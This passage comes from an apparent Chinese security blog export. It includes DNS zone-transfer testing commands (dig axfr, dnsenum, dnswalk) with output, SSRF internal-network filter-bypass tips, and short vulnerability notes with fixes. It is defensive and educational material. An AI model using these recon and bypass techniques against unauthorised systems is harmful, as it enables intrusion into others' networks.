href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h1><h2 id="1、Windows下使用nslookup"><a href="#1、Windows下使用nslookup" class="headerlink" title="1、Windows下使用nslookup"></a>1、Windows下使用nslookup</h2><p>nslookup命令以两种方式运行：非交互式和交互式。</p><p>1、非交互式模式下，查看对应主机域的域名服务器</p><pre class="line-numbers language-none"><code class="language-none">~# nslookup -type&#x3D;ns teamssix.com服务器:  ns-gg.online.ny.cnAddress:  118.192.13.5非权威应答:teamssix.com    nameserver &#x3D; clint.ns.cloudflare.comteamssix.com    nameserver &#x3D; isla.ns.cloudflare.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、进入交互模式，指定域名服务器，列出域名信息</p><pre class="line-numbers language-none"><code class="language-none">~# nslookup默认服务器:  ns-gg.online.ny.cnAddress:  118.192.13.5&gt; server clint.ns.cloudflare.com默认服务器:  clint.ns.cloudflare.comAddresses:  2400:cb00:2049:1::adf5:3b5a          2606:4700:58::adf5:3b5a          173.245.59.90&gt; ls teamssix.comls: connect: No such file or directory*** 无法列出域 teamssix.com: Unspecified errorDNS 服务器拒绝将区域 teamssix.com 传送到你的计算机。如果这不正确，请检查 IP 地址 2400:cb00:2049:1::adf5:3b5a 的 DNS 服务器上 teamssix.com 的区域传送安全设置。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果提示无法列出域，那就说明此域名不存在域传送漏洞。</p><h2 id="2、Kali下使用dig、dnsenum、dnswalk"><a href="#2、Kali下使用dig、dnsenum、dnswalk" class="headerlink" title="2、Kali下使用dig、dnsenum、dnswalk"></a>2、Kali下使用dig、dnsenum、dnswalk</h2><h3 id="a、dig"><a href="#a、dig" class="headerlink" title="a、dig"></a>a、dig</h3><p>这里涉及dig 一个重要的命令axfr，axfr 是q-type类型的一种，axfr类型是Authoritative Transfer的缩写，指请求传送某个区域的全部记录。</p><p>我们只要欺骗dns服务器发送一个axfr请求过去，如果该dns服务器上存在该漏洞，就会返回所有的解析记录值。</p><p>dig的整体利用步骤基本和nslookup一致。</p><p>1、查看对应主机域的域名服务器</p><pre class="line-numbers language-none"><code class="language-none">~# dig teamssix.com ns; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; teamssix.com ns;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 16945;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0;; QUESTION SECTION:;teamssix.com.                  IN      NS;; ANSWER SECTION:teamssix.com.           5       IN      NS      clint.ns.cloudflare.com.teamssix.com.           5       IN      NS      isla.ns.cloudflare.com.;; Query time: 6 msec;; SERVER: 10.18.37.7#54(10.18.37.7);; WHEN: Fri Dec 06 03:30:37 EST 2019;; MSG SIZE  rcvd: 83<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、向该域名发送axfr 请求</p><pre class="line-numbers language-none"><code class="language-none">~# dig axfr @clint.ns.cloudflare.com teamssix.com; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1-Debian &lt;&lt;&gt;&gt; axfr @clint.ns.cloudflare.com teamssix.com; (3 servers found);; global options: +cmd; Transfer failed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="b、dnsenum"><a href="#b、dnsenum" class="headerlink" title="b、dnsenum"></a>b、dnsenum</h3><p>这个工具相较于之前的方法要为简单，一行命令即可</p><pre class="line-numbers language-none"><code class="language-none">~# dnsenum -enum teamssix.comSmartmatch is experimental at &#x2F;usr&#x2F;bin&#x2F;dnsenum line 698.Smartmatch is experimental at &#x2F;usr&#x2F;bin&#x2F;dnsenum line 698.dnsenum VERSION:1.2.4Warning: can&#39;t load Net::Whois::IP module, whois queries disabled.Warning: can&#39;t load WWW::Mechanize module, Google scraping desabled.-----   teamssix.com   -----Host&#39;s addresses:__________________teamssix.com.                            5        IN    A        104.28.22.70teamssix.com.                            5        IN    A        104.28.23.70Name Servers:______________isla.ns.cloudflare.com.                  5        IN    A        173.245.58.119clint.ns.cloudflare.com.                 5        IN    A        173.245.59.90clint.ns.cloudflare.com.                 5        IN    RRSIG             (Mail (MX) Servers:___________________Trying Zone Transfers and getting Bind Versions:_________________________________________________Trying Zone Transfer for teamssix.com on isla.ns.cloudflare.com ...AXFR record query failed: FORMERRTrying Zone Transfer for teamssix.com on clint.ns.cloudflare.com ...AXFR record query failed: FORMERRbrute force file not specified, bay.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="c、dnswalk"><a href="#c、dnswalk" class="headerlink" title="c、dnswalk"></a>c、dnswalk</h3><p>dnswalk的使用同样一条命令，但是注意在域名最后加上一个点</p><pre class="line-numbers language-none"><code class="language-none">~# dnswalk teamssix.com.Checking teamssix.com.Getting zone transfer of teamssix.com. from clint.ns.cloudflare.com...failedFAIL: Zone transfer of teamssix.com. from clint.ns.cloudflare.com failed: FORMERRGetting zone transfer of teamssix.com. from isla.ns.cloudflare.com...failedFAIL: Zone transfer of teamssix.com. from isla.ns.cloudflare.com failed: FORMERRBAD: All zone transfer attempts of teamssix.com. failed!2 failures, 0 warnings, 1 errors.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-修复建议"><a href="#0x02-修复建议" class="headerlink" title="0x02 修复建议"></a>0x02 修复建议</h1><p>区域传送是 DNS 常用的功能，为保证使用安全，应严格限制允许区域传送的主机，例如一个主 DNS 服务器应该只允许它的备用 DNS 服务器执行区域传送功能。</p><p>在相应的 zone、options 中添加 allow-transfer，对执行此操作的服务器进行限制。如：</p><ul><li><p>严格限制允许进行区域传送的客户端的 IP</p><pre class="line-numbers language-none"><code class="language-none">allow-transfer ｛1.1.1.1; 2.2.2.2;｝<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置 TSIG key</p><pre class="line-numbers language-none"><code class="language-none">allow-transfer ｛key &quot;dns1-slave1&quot;; key &quot;dns1-slave2&quot;;｝<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>最后感谢前辈们的文章与辛勤奉献，DNS域传送漏洞除了本文中讨论的方法外，也可以使用Python脚本或者万能的nmap，这里就不做讨论啦。</p></li></ul><p>想写这篇文章已经想一周了，今天终于有时间给整理整理，另外前文发布的Pigat工具，最近也会修复一些bug提交到Github更新哒。</p><blockquote><p>更多信息欢迎关注我的个人公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="http://sunu11.com/2017/03/16/8/">http://sunu11.com/2017/03/16/8/</a><br><a href="https://www.jianshu.com/p/d2af08e6f8fb">https://www.jianshu.com/p/d2af08e6f8fb</a><br><a href="http://www.lijiejie.com/dns-zone-transfer-1/">http://www.lijiejie.com/dns-zone-transfer-1/</a><br><a href="https://www.alibabacloud.com/help/zh/faq-detail/37529.htm">https://www.alibabacloud.com/help/zh/faq-detail/37529.htm</a><br><a href="https://www.lsablog.com/networksec/awd/dns-zone-transfer/">https://www.lsablog.com/networksec/awd/dns-zone-transfer/</a><br><a href="https://larry.ngrep.me/2015/09/02/DNS-zone-transfer-studying/">https://larry.ngrep.me/2015/09/02/DNS-zone-transfer-studying/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> DNS </tag>
            
            <tag> 域传送 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【直播笔记】白帽子的成长之路</title>
      <link href="//191201-220910.html"/>
      <url>//191201-220910.html</url>
      
        <content type="html"><![CDATA[<ul><li><p>子域名监听工具：<a href="https://github.com/guimaizi/get_domain%EF%BC%8C%E6%96%B0%E5%87%BA%E6%9D%A5%E7%9A%84%E5%AD%90%E5%9F%9F%E5%90%8D%E5%BE%80%E5%BE%80%E6%BC%8F%E6%B4%9E%E8%BE%83%E5%A4%9A">https://github.com/guimaizi/get_domain，新出来的子域名往往漏洞较多</a></p></li><li><p>关于挖掘src漏洞:</p></li></ul><ol><li>白帽子主要是寻找扫描器和风控系统覆盖不到的地方，比如domxss、越权漏洞和逻辑漏洞</li><li>开发运维人员的一些疏忽的点<a id="more"></a></li><li>还有因为厂商毕竟是赚钱是第一要务，因双十一、游戏活动之类紧急上线的业务并没有被安全部门测试过，这些通常会出现问题。</li><li>漏洞主要还是存在于交互处，也就是需要表单填写多的地方，这种场景大家应该会时常遇到。</li><li>漏洞利用，这是厂商和当前法律明令禁止的….请参考国外博客，和自己私下测试，还有纯刷src角度，我个人觉得别用扫描器扫厂商业务，他们一个payload打过去,封ip封账号不说，爬虫爬过去说不定你就收到一张传票或者被查水表，就进去了……</li></ol><ul><li><p>学习路径：<a href="https://mp.weixin.qq.com/s/nE8a4Z-qCXwOrvZXE-gLFg">https://mp.weixin.qq.com/s/nE8a4Z-qCXwOrvZXE-gLFg</a></p></li><li><p>SSRF无回显的挖掘方法：<a href="https://mp.weixin.qq.com/s/R-N9e0PfrWY2GluLrjLlww">https://mp.weixin.qq.com/s/R-N9e0PfrWY2GluLrjLlww</a></p></li></ul><ol><li>基本上useragent是来自容器的 都很大程度上存在这个漏洞</li><li>这个漏洞最简单的挖掘方法就是先尝试一遍外网 判断是否服务器端发起的，再去找该厂商的内网ip或者内网域名</li><li>找到后需要遍历它内网有什么端口</li><li>如果想把它当作内网一样访问资产，可以利用fiddler配置一下就可以了。</li><li>如果它存在不让请求内网的怎么办？可以买一个域名，将域名A解析到它内网ip再做请求，或者利用302跳转，短链接等方式</li></ol><ul><li><p>bypass技巧：<a href="https://mp.weixin.qq.com/s/zIOH1nMe-Ekeo4ga2wDRgw">https://mp.weixin.qq.com/s/zIOH1nMe-Ekeo4ga2wDRgw</a></p></li><li><p>关于考证</p></li></ul><ol><li>如果是搞渗透测试方向的话，入门建议OSCP，这是公认的全球最强渗透测试认证资质。考完了也就相当于拥有了渗透测试中级水平，完全可以应对国内大多数渗透测试岗位工作</li><li>cisp-pte、cisp-pts这类国测的证，主要是找投标资质用的，实战意义不是太大</li><li>cisp可以帮助大家更加全面的认真整个信息安全，从宏观上了解我国对于信息安全的政策和相关知识</li></ol><ul><li>[TPSA19-22]SRC行业安全测试规范：<a href="https://security.tencent.com/index.php/announcement/msg/180">https://security.tencent.com/index.php/announcement/msg/180</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 直播 </tag>
            
            <tag> 笔记 </tag>
            
            <tag> 总结 </tag>
            
            <tag> 成长之路 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞笔记】Robots.txt站点文件</title>
      <link href="//191127-201447.html"/>
      <url>//191127-201447.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：Robots.txt站点文件</p><p>风险等级：低</p><p>问题类型：服务器设置问题</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>Robots.txt文件中声明了不想被搜索引擎访问的部分或者指定搜索引擎收录指定的部分。</p><a id="more"></a><p>此信息可以帮助攻击者得到网站部分文件名称、目录名称，了解网站结构。</p><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>攻击者可通过发现robots.txt文件，收集网站的敏感目录或文件，从而有针对性的进行利用。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>1、将敏感的文件和目录放在一个排除搜索引擎访问的目录中</p><p>2、robots.txt内容可设为Disallow: /，禁止搜索引擎访问网站的任何内容</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞笔记 </tag>
            
            <tag> Robots.txt </tag>
            
            <tag> 服务器设置问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞笔记】Host头攻击</title>
      <link href="//191127-201443.html"/>
      <url>//191127-201443.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：Host头攻击</p><p>风险等级：低</p><p>问题类型：管理员设置问题</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>Host首部字段是HTTP/1.1新增的，旨在告诉服务器，客户端请求的主机名和端口号，主要用来实现虚拟主机技术。</p><a id="more"></a><p>运用虚拟主机技术，单个主机可以运行多个站点。</p><p>例如：hacker和usagidesign两个站点都运行在同一服务器A上，不管我们请求哪个域名，最终都会被解析成服务器A的IP地址，这个时候服务器就不知道该将请求交给哪个站点处理，因此需要Host字段指定请求的主机名。</p><p>我们访问hacker域名，经DNS解析，变成了服务器A的IP，请求传达到服务器A，A接收到请求后，发现请求报文中的Host字段值为hacker，进而将请求交给hacker站点处理。</p><p>这个时候，问题就出现了。为了方便获取网站域名，开发人员一般依赖于请求包中的Host首部字段。例如，在php里用_SERVER[“HTTP_HOST”]，但是这个Host字段值是不可信赖的(可通过HTTP代理工具篡改)。</p><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>如果应用程序没有对Host字段值进行处理，就有可能造成恶意代码的传入。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>对Host字段进行检测</p><p>Nginx，修改ngnix.conf文件，在server中指定一个server_name名单，并添加检测。</p><p>Apache，修改httpd.conf文件，指定ServerName，并开启UseCanonicalName选项。</p><p>Tomcat，修改server.xml文件，配置Host的name属性。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="https://www.jianshu.com/p/690acbf9f321">https://www.jianshu.com/p/690acbf9f321</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞笔记 </tag>
            
            <tag> 管理员设置问题 </tag>
            
            <tag> Host头 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验总结】常见的HTTP方法</title>
      <link href="//191127-201438.html"/>
      <url>//191127-201438.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>根据HTTP标准，HTTP请求可以使用多种请求方法。</p><p>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。</p><p>HTTP1.1新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT方法。</p><a id="more"></a><h1 id="0x01-GET"><a href="#0x01-GET" class="headerlink" title="0x01 GET"></a>0x01 GET</h1><p>GET方法用于请求指定的页面信息，并返回实体主体。</p><h1 id="0x02-HEAD"><a href="#0x02-HEAD" class="headerlink" title="0x02 HEAD"></a>0x02 HEAD</h1><p>HEAD方法请求一个与GET请求的响应相同的响应，但没有响应体。</p><h1 id="0x03-POST"><a href="#0x03-POST" class="headerlink" title="0x03 POST"></a>0x03 POST</h1><p>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。</p><p>数据被包含在请求体中，POST请求可能会导致新的资源建立或已有资源的修改。</p><h1 id="0x04-PUT"><a href="#0x04-PUT" class="headerlink" title="0x04 PUT"></a>0x04 PUT</h1><p>PUT方法用请求有效载荷替换目标资源的所有当前表示。</p><h1 id="0x05-DELETE"><a href="#0x05-DELETE" class="headerlink" title="0x05 DELETE"></a>0x05 DELETE</h1><p>请求服务器删除指定的页面。</p><h1 id="0x06-CONNECT"><a href="#0x06-CONNECT" class="headerlink" title="0x06 CONNECT"></a>0x06 CONNECT</h1><p>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</p><h1 id="0x07-OPTIONS"><a href="#0x07-OPTIONS" class="headerlink" title="0x07 OPTIONS"></a>0x07 OPTIONS</h1><p>允许客户端查看服务器的性能。</p><h1 id="0x08-TRACE"><a href="#0x08-TRACE" class="headerlink" title="0x08 TRACE"></a>0x08 TRACE</h1><p>回显服务器收到的请求，主要用于测试或诊断。</p><h1 id="0x09-PATCH"><a href="#0x09-PATCH" class="headerlink" title="0x09 PATCH"></a>0x09 PATCH</h1><p>是对PUT方法的补充，用来对已知资源进行局部更新。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="https://www.runoob.com/http/http-methods.html">https://www.runoob.com/http/http-methods.html</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 经验总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 经验总结 </tag>
            
            <tag> HTTP方法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞笔记】ASP.NET允许文件调试</title>
      <link href="//191126-215809.html"/>
      <url>//191126-215809.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：ASP.NET允许文件调试</p><p>风险等级：低</p><p>问题类型：管理员设置问题</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>发送DEBUG动作的请求，如果服务器返回内容为OK，那么服务器就开启了调试功能，可能会导致有关Web应用程序的敏感信息泄露，例如密码、路径等。</p><a id="more"></a><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>可能会泄露密码、路径等敏感信息。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>编辑Web.config文件，设置<code>&amp;lt;compilation debug=&quot;false&quot;/&amp;gt;</code></p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞笔记 </tag>
            
            <tag> ASP.NET </tag>
            
            <tag> 管理员设置问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞笔记】IIS短文件名泄露</title>
      <link href="//191126-215804.html"/>
      <url>//191126-215804.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：IIS短文件名泄露</p><p>风险等级：低</p><p>问题类型：信息泄露</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>此漏洞实际是由HTTP请求中旧DOS 8.3名称约定（SFN）的代字符（〜）波浪号引起的。</p><a id="more"></a><p>为了兼容16位MS-DOS程序，Windows为文件名较长的文件（和文件夹）生成了对应的windows 8.3 短文件名。</p><p>Microsoft IIS 波浪号造成的信息泄露是世界网络范围内最常见的中等风险漏洞。这个问题至少从1990年开始就已经存在，但是已经证明难以发现，难以解决或容易被完全忽略。</p><p><strong>受影响的版本：</strong><br>IIS 1.0，Windows NT 3.51 <br>IIS 3.0，Windows NT 4.0 Service Pack 2 <br>IIS 4.0，Windows NT 4.0选项包<br>IIS 5.0，Windows 2000 <br>IIS 5.1，Windows XP Professional和Windows XP Media Center Edition <br>IIS 6.0，Windows Server 2003和Windows XP Professional x64 Edition <br>IIS 7.0，Windows Server 2008和Windows Vista <br>IIS 7.5，Windows 7（远程启用<customErrors>或没有web.config）<br>IIS 7.5，Windows 2008（经典管道模式）<br>注意：IIS使用.Net Framework 4时不受影响</p><p><strong>漏洞的局限性：</strong></p><ol><li>只能猜解前六位，以及扩展名的前3位。</li><li>名称较短的文件是没有相应的短文件名的。<br>3）需要IIS和.net两个条件都满足。</li></ol><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p><strong>主要危害：利用“~”字符猜解暴露短文件/文件夹名</strong></p><p>由于短文件名的长度固定（xxxxxx~xxxx），因此黑客可直接对短文件名进行暴力破解 ，从而访问对应的文件。</p><p>举个例子，有一个数据库备份文件 backup_<a href="http://www.abc.com_20150101.sql/">www.abc.com_20150101.sql</a> ，它对应的短文件名是 backup<del>1.sql 。因此黑客只要暴力破解出backup</del>1.sql即可下载该文件，而无需破解完整的文件名。</p><p>**次要危害：.Net Framework的拒绝服务攻击 **</p><p>攻击者如果在文件夹名称中发送一个不合法的.Net文件请求，.NeFramework将递归搜索所有的根目录，消耗网站资源进而导致DOS问题。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>1、CMD关闭NTFS 8.3文件格式的支持</p><p>2、修改注册表禁用短文件名功能</p><p>3、关闭Web服务扩展- ASP.NET</p><p>4、升级netFramework至4.0以上版本</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="https://www.freebuf.com/articles/web/172561.html">https://www.freebuf.com/articles/web/172561.html</a><br><a href="https://segmentfault.com/a/1190000006225568">https://segmentfault.com/a/1190000006225568</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞笔记 </tag>
            
            <tag> IIS </tag>
            
            <tag> 信息泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pigat：一款被动信息收集聚合工具</title>
      <link href="//191126-215759.html"/>
      <url>//191126-215759.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Pigat即Passive Intelligence Gathering Aggregation Tool，翻译过来就是被动信息收集聚合工具，既然叫聚合工具，也就是说该工具将多款被动信息收集工具结合在了一起，进而提高了平时信息收集的效率。</p><p>早在一个月前便萌生了开发这个工具的想法，但是一直没有时间，正好最近有时间了，就简单写一下。</p><a id="more"></a><p>因为我没有太多的开发经验，所以这款工具难免存在需要改进的地方，因此希望各位大佬能够多多反馈这款工具存在的问题，一起完善这个工具。</p><h1 id="0x01-工具原理及功能概述"><a href="#0x01-工具原理及功能概述" class="headerlink" title="0x01 工具原理及功能概述"></a>0x01 工具原理及功能概述</h1><p>这款工具的原理很简单，用户输入目标url，再利用爬虫获取相关被动信息收集网站关于该url的信息，最后回显出来。</p><p>目前该工具具备8个功能，原该工具具备7个功能，分别为收集目标的资产信息、CMS信息、DNS信息、备案信息、IP地址、子域名信息、whois信息，现加入第8个功能：如果在程序中两次IP查询目标URL的结果一致，那么查询该IP的端口，即端口查询功能。</p><h1 id="0x02-工具简单上手使用"><a href="#0x02-工具简单上手使用" class="headerlink" title="0x02 工具简单上手使用"></a>0x02 工具简单上手使用</h1><h2 id="1、查看帮助信息"><a href="#1、查看帮助信息" class="headerlink" title="1、查看帮助信息"></a>1、查看帮助信息</h2><pre class="line-numbers language-none"><code class="language-none"># python pigat.py -h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、指定url进行信息获取"><a href="#2、指定url进行信息获取" class="headerlink" title="2、指定url进行信息获取"></a>2、指定url进行信息获取</h2><p>如果只指定url这一个参数，没有指定其他参数，则默认获取该url的所有信息</p><pre class="line-numbers language-none"><code class="language-none"># python pigat.py -u teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="3、指定url进行单项信息获取"><a href="#3、指定url进行单项信息获取" class="headerlink" title="3、指定url进行单项信息获取"></a>3、指定url进行单项信息获取</h2><pre class="line-numbers language-none"><code class="language-none"># python pigat.py -u baidu.com --assert<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="4、指定url进行多项信息获取"><a href="#4、指定url进行多项信息获取" class="headerlink" title="4、指定url进行多项信息获取"></a>4、指定url进行多项信息获取</h2><pre class="line-numbers language-none"><code class="language-none"># python pigat.py -u teamssix.com --ip --cms<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/pigat5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x03-工具获取"><a href="#0x03-工具获取" class="headerlink" title="0x03 工具获取"></a>0x03 工具获取</h1><p>关于此工具的下载地址可在我的个人公众号（TeamsSix）回复”pigat”获取。</p><h1 id="0x04-声明"><a href="#0x04-声明" class="headerlink" title="0x04 声明"></a>0x04 声明</h1><p>1、本文在FreeBuf首发，原文地址在文章尾部</p><p>2、由于我的个人疏忽，导致在FreeBuf文中获取工具的方式存在错误的地方，正确的获取方式应是回复”pigat”，而不是”pigta”，这就导致不少人及时回复了关键词也没有获取到工具地址，在这里表示深刻歉意，现在公众号后台规则已经更新，上述两个关键词均可以获取到工具地址。</p><blockquote><p>原文地址：<a href="https://www.freebuf.com/sectool/219681.html">https://www.freebuf.com/sectool/219681.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 工具分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 被动信息收集 </tag>
            
            <tag> pigat </tag>
            
            <tag> 聚合工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞笔记】测试目录</title>
      <link href="//191125-195302.html"/>
      <url>//191125-195302.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：测试目录</p><p>风险等级：低</p><p>问题类型：信息泄露</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>Web应用程序在开发过程中，程序员为了测试代码功能，在Web目录下新建测试目录，存放测试代码，可能包含敏感信息。</p><a id="more"></a><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>攻击者读取测试目录信息，以便进一步攻击目标站点。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>删除或者限制访问测试目录。</p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞笔记 </tag>
            
            <tag> 信息泄露 </tag>
            
            <tag> 测试目录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞笔记】测试文件</title>
      <link href="//191125-195256.html"/>
      <url>//191125-195256.html</url>
      
